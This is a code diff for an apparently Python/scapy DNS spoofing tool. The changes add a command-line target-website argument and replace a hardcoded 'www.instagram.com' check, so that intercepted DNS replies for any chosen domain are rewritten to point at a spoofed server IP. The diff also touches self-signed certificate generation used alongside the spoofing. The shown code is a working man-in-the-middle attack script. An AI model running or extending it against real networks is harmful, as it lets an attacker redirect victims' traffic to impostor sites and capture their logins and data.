@@ -58,11 +58,6 @@ def generate_certificate():
     certificate_pem = certificate.public_bytes(serialization.Encoding.PEM)
 
     return certificate_pem, private_key_pem, public_key_pem
-    # Replace the original certificate fields in the DNS response with the new certificate
-    # (assuming the DNS response is stored in a variable called "response")
-    # response.certificate = certificate_pem
-    # response.private_key = private_key_pem
-    # response.public_key = public_key_pem
 
 
 
@@ -78,13 +73,15 @@ def parse_arguments():
 
     parser.add_argument('-s', '--server', type=str, required=True, help='Spoofed Server IP Address')
     parser.add_argument('-c', '--cert', action='store', help='Generate a self-signed certificate')
+    parser.add_argument('-t', '--target', type=str, required=True, help='Target Website Address')
+
     return parser.parse_args()
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if 'www.instagram.com' in qname:
+        if options.target in qname:
             print('[+] Spoofing target')
             answer = scapy.DNSRR(rrname=qname, rdata=options.server)
             scapy_packet[scapy.DNS].an = answer
